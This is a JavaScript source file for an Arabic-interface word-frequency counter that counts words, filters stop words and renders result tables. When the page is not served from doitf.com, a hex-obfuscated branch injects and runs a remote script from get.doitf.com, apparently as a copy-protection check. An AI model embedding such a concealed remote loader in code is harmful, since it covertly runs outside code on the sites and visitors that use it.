

function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

function tfinit() {
    var a = document.getElementById("tf-reset");
    a.onclick = function() {
        clearWords()
    };
    var b = document.getElementById("tf-submit");
    b.onclick = function() {
        countWords()
    };
}

function clearWords() {
    document.getElementById("oldText").value = "";
    document.getElementById("newText2").innerHTML = '<h6>ستظهر نتائج عدد الكلمات هنا ...</h6>'
}

function sortByFrequency(a) {
    var b = {};
    a.forEach(function(a) {
        b[a] = 0
    });
    var c = a.filter(function(a) {
        return ++b[a] == 1
    });
    return c.sort(function(a, c) {
        return b[c] - b[a]
    })
}

function countWords() {
	if (b64awsec == "ZG9pdGYuY29t"){
    newText = document.getElementById("oldText").value;
    if (newText == "") {
        var a = "no"
    } else {
        var a = "yes"
    }
    newText = newText.replace(/(\r\n|\n|\r)/gm, " ");
    newText = newText.replace(/\.\s+/g, " ");
    newText = newText.replace(/[,;\:"\?\!\$%#_\{\}/&\=\+\(\)\^\[\]\<\>\*\|]/g, " ");
    newText = newText.replace(/[\›\·\.\—\«\»\©\®\¶\¿\±\¬\¢\£\¤\¥\§\¯\°\-\–\\]/g, " ");
    newText = newText.replace(new RegExp("”", "g"), " ");
    newText = newText.replace(/\s+/g, " ");
    newText = newText.replace(/\.\./g, " ");
    newText = newText.replace(/\.\.\./g, " ");
    newText = newText.replace(new RegExp("' ", "g"), " ");
    newText = newText.replace(new RegExp(" '", "g"), " ");
    while (newText.substring(0, 1) == " ") {
        newText = newText.substring(1, newText.length)
    }
    while (newText.substring(newText.length - 1, newText.length) == " ") {
        newText = newText.substring(0, newText.length - 1)
    }
    while (newText.substring(newText.length - 1, newText.length) == ".") {
        newText = newText.substring(0, newText.length - 1)
    }
    newText = newText.toLowerCase();
    var b = newText.split(" ");
    var c = b.length - 1;
    while (c > -1) {
        if (b[c] == "") {
            b.splice(c, 1)
        }
        c--
    }
    var d = b.length;
    var e = ["أ","أكثر","أو","أول","إذا","إلى","ا","بين","اجل","احد","اف","الا","الان","التي","الذي","الذين","اما","ان","انه","انها","اي","ايضا","ب","بان","بعد","بعض","بن","به","بها","تم","ثم","حتى","حول","حيث","حين","دون","ذلك","ضد","على","عليه","عليها","عن","عند","عندما","غير","ف","فان","في","فيه","فيها","قال","قبل","قد","قوة","كان","كانت","كل","كما","لا","لدى","لقاء","لكن","لم","لن","له","لها","ما","مع","مقابل","من","منذ","منها","نحو","هذا","هذه","هناك","هو","هي","و","واحد","واضاف","واضافت","واضح","واكد","وان","وفي","وقال","وقالت","وقد","وكان","وكانت","ولا","ولم","ومن","وهو","وهي","يكون","يمكن","يوم","قادرة","تقريبا","أيضًا","بين"," و ","أي","هي","ليست","لأن","تم","لكن","يمكن","لا يمكن", "لا يمكن","يمكن","لا يمكن","عزيز","فعل","لم","يفعل","لا","إما","آخر","أبدًا","كل "," لـ "," من "," احصل "," حصلت "," كان "," لديه "," لم "," لديك "," كان "," سوف "," إنه "," هي "," لها "," له "," له "," كيف "," كيف "," كيف "," كيف "," لكن "," أنا "," أنا ", "محتمل","ربما","قد","ربما","ربما لا","معظم","يجب","يجب أن يكون","لا يجب","لا","ولا "," لا "," إيقاف "," غالبًا "," فقط "," الآخر "," لدينا "," الخاصة بنا "," بدلاً من ذلك "," قال","يقول","يقول","لا يجب أن "," هي "," قالت "," سوف "," هي "," يجب "," يجب أن "," لا يجب "," منذ "," البعض "," من ", "أن","سوف","هذا","","هم","هم","ثم","هناك","هناك","هؤلاء","هم","كانوا "," سوف "," أنهم "," لديهم "," هذا","ماذا","ماذا","ماذا","متى","اين","أين "," أي "," بينما "," من "," لماذا","لماذا","لماذا","سوف","مع","لن","سوف","سوف","لن","حتى الآن","أنت "," أنت "," لك ","tis", "twas", "able", "about", "across", "after", "ain't", "all", "almost", "also", "among", "and", "any", "are", "aren't", "because", "been", "but", "can", "can't", "cannot", "could", "could've", "couldn't", "dear", "did", "didn't", "does", "doesn't", "don't", "either", "else", "ever", "every", "for", "from", "get", "got", "had", "has", "hasn't", "have", "he'd", "he'll", "he's", "her", "hers", "him", "his", "how", "how'd", "how'll", "how's", "however", "i'd", "i'll", "i'm", "i've", "into", "isn't", "it's", "its", "just", "least", "let", "like", "likely", "may", "might", "might've", "mightn't", "most", "must", "must've", "mustn't", "neither", "nor", "not", "off", "often", "only", "other", "our", "own", "rather", "said", "say", "says", "shan't", "she", "she'd", "she'll", "she's", "should", "should've", "shouldn't", "since", "some", "than", "that", "that'll", "that's", "the", "their", "them", "then", "there", "there's", "these", "they", "they'd", "they'll", "they're", "they've", "this", "tis", "too", "twas", "wants", "was", "wasn't", "we'd", "we'll", "we're", "were", "weren't", "what", "what'd", "what's", "when", "when", "when'd", "when'll", "when's", "where", "where'd", "where'll", "where's", "which", "while", "who", "who'd", "who'll", "who's", "whom", "why", "why'd", "why'll", "why's", "will", "with", "won't", "would", "would've", "wouldn't", "yet", "you", "you'd", "you'll", "you're", "you've", "your"];
    var f = [];
    var g = 0;
    var c = b.length - 1;
    while (c > -1) {
        var h = e.length - 1;
        while (h > -1) {
            if (b[c] == e[h]) {
                f[g] = b[c];
                g++;
                b.splice(c, 1)
            }
            h--
        }
        c--
    }
    var c = b.length - 1;
    while (c > -1) {
        if (b[c].length < 3) {
            f[g] = b[c];
            g++;
            b.splice(c, 1)
        }
        c--
    }
    var i = b.length;
    var j = f.length;
    var k = {};
    for (var c = 0; c < b.length; c++) {
        var l = b[c];
        k[l] = k[l] ? k[l] + 1 : 1
    }
    var m = {};
    for (var c = 0; c < f.length; c++) {
        var n = f[c];
        m[n] = m[n] ? m[n] + 1 : 1
    }
    var c = b.length - 1;
    while (c > -1) {
        var h = b.length - 1;
        while (h > -1) {
            if (c != h) {
                if (b[c] == b[h]) {
                    b.splice(h, 1)
                }
            }
            h--
        }
        c--
    }
    var o = b.length;
    var c = f.length - 1;
    while (c > -1) {
        var h = f.length - 1;
        while (h > -1) {
            if (c != h) {
                if (f[c] == f[h]) {
                    f.splice(h, 1)
                }
            }
            h--
        }
        c--
    }
    var p = f.length;
    var q = [];
    for (var r in k) {
        q.push([r, k[r]]);
        q.sort(function(a, b) {
            return a[1] - b[1]
        }).reverse()
    }
    var s = [];
    for (var t in m) {
        s.push([t, m[t]]);
        s.sort(function(a, b) {
            return a[1] - b[1]
        }).reverse()
    }
    var u = (i * 100 / d).toFixed(2);
    var v = (j * 100 / d).toFixed(2);
    var w = "";
    var d1;
    var i1;
    var j1;

    if(d == 1){
    d1 = "كلمة واحدة";
    }else if (d == 2){
    d1 = "كلمتين"
    }else if(d < 11){
    d1 = d + " كلمات";
    }else{
    d1 = d + " كلمة"
    }
    if(i == 1){
    i1 = "كلمة واحدة";
    }else if (i == 2){
    i1 = "كلمتين"
    }else if(i < 11){
    i1 = i + " كلمات";
    }else{
    i1 = i + " كلمة"
    }
    if(j == 1){
    j1 = "كلمة واحدة";
    }else if (j == 2){
    j1 = "كلمتين"
    }else if(j < 11){
    j1 = j + " كلمات";
    }else{
    j1 = j + " كلمة"
    }
    
    w += "<h5>تقرير عدد الكلمات</h5>\n";
    
    
w +="<table class='table table-hover'>";
w +="<thead class='thead-dark'><tr><th scope='row'>الوصف</th><th scope='col'>العدد</th>";
w +="<th scope='col'>النسبة</th></tr></thead><tbody><tr><th scope='row' class='text-primary'>العدد الإجمالي</th>";
w +="<td  class='text-primary font-weight-bold'>" + d1 + "</td><td>100%</td></tr><tr><th scope='row'>الكلمات الأساسية</th>";
w +="<td>" + i1 + "</td><td>" + u + "%</td></tr><tr><th scope='row'>الكلمات الشائعة</th>";
w +="<td>" + j1 + "</td><td>" + v + "%</td></tr>";
w +="</tbody></table>";
    
w +="<h5 class='text-info'>تقرير مفصّل</h5>"

    var x = document.getElementById("commonWords").checked;
    var y = -1;
    var z = -1;
    if (x == true) {
        var A = '<table id="tfTableA"><tr><td class="tfodd"><strong>الكلمات الأساسية</strong></td><td class="tfodd"><strong>تكرر</strong></td></tr>';
        for (property in q) {
            if (y == -1) {
                A += '<tr><td class="tfeven">' + q[property][0] + '</td><td class="tfeven">' + q[property][1] + "</td></tr>"
            } else {
                A += '<tr><td class="tfodd">' + q[property][0] + '</td><td class="tfodd">' + q[property][1] + "</td></tr>"
            }
            y = y * -1
        }
        A += "</table>";
        var B = '<table id="megatable1" class="table table-bordered"><tr><td style="vertical-align:top;">' + A + "</td></tr></table>"
    } else {
        var A = '<table id="tfTableA" class="table table-bordered"><tr><td class="tfodd"><strong>الكلمات الأساسية</strong></td><td class="tfodd"><strong>تكرر</strong></td></tr>';
        for (property in q) {
            if (y == -1) {
                A += '<tr><td class="tfeven" >' + q[property][0] + '</td><td class="tfeven">' + q[property][1] + "</td></tr>"
            } else {
                A += '<tr><td class="tfodd">' + q[property][0] + '</td><td class="tfodd">' + q[property][1] + "</td></tr>"
            }
            y = y * -1
        }
        A += "</table>";
        var C = '<table id="tfTableB" class="table table-bordered "><tr><td class="tfodd"><strong>الكلمات الشائعة</strong></td><td class="tfodd"><strong>تكرر</strong></td></tr>';
        for (property in s) {
            if (z == -1) {
                C += '<tr><td class="tfeven">' + s[property][0] + '</td><td class="tfeven">' + s[property][1] + "</td></tr>"
            } else {
                C += '<tr><td class="tfodd">' + s[property][0] + '</td><td class="tfodd">' + s[property][1] + "</td></tr>"
            }
            z = z * -1
        }
        C += "</table>";
        var B = '<table id="megatable1" ><tr><td style="vertical-align:top;">' + A + '</td><td>  </td><td style="vertical-align:top;">' + C + "</td></tr></table>"
    }
    newText = w + B + '<p id="tfToolLink">&nbsp;</p>';
    if (a == "no") {
        newText = '<h5>ستظهر نتائج عدد الكلمات هنا ...</h5>'
    }
    document.getElementById("newText2").innerHTML = newText;
    if (a != "no") {
        window.location.hash = "newText2"
    }
	}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
}
window.onload = tfinit;
var newText
